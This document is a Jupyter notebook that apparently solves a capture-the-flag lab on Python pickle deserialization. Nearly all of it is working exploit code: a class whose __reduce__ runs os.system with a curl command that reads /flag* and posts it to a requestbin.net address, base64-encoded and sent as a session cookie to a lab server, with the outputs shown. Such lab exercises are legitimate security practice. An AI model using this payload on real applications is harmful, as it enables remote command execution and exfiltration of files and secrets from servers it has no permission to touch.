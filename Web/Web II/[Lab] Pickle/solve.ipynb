{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 266,
   "id": "b752756b-11f8-432a-b68a-14674cff3cfb",
   "metadata": {},
   "outputs": [],
   "source": [
    "import base64\n",
    "import pickle\n",
    "import os\n",
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 263,
   "id": "3501be40-24eb-498f-929a-d1ad4425db7c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x80\\x04\\x95\\\\\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x05posix\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8cAcurl -X POST -d \"$(cat /flag*)\" https://requestbin.net/r/bto07rio\\x94\\x85\\x94R\\x94.'"
      ]
     },
     "execution_count": 263,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "class T1(dict):\n",
    "    def __reduce__(self):\n",
    "        return (os.system, ('curl -X POST -d \"$(cat /flag*)\" https://requestbin.net/r/bto07rio',))\n",
    "    \n",
    "t1 = pickle.dumps(T1())\n",
    "t1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 264,
   "id": "24563b75-690b-47f3-af56-b093f53d9ace",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'gASVXAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjEFjdXJsIC1YIFBPU1QgLWQgIiQoY2F0IC9mbGFnKikiIGh0dHBzOi8vcmVxdWVzdGJpbi5uZXQvci9idG8wN3Jpb5SFlFKULg=='"
      ]
     },
     "execution_count": 264,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "session = base64.b64encode(t1)\n",
    "session"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 265,
   "id": "94b81d95-a53f-4433-8cdc-98acd8a52813",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\\n<title>500 Internal Server Error</title>\\n<h1>Internal Server Error</h1>\\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\\n'"
      ]
     },
     "execution_count": 265,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "requests.get(\"http://h4ck3r.quest:8400/\", cookies={\"session\": session.decode()}).text"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
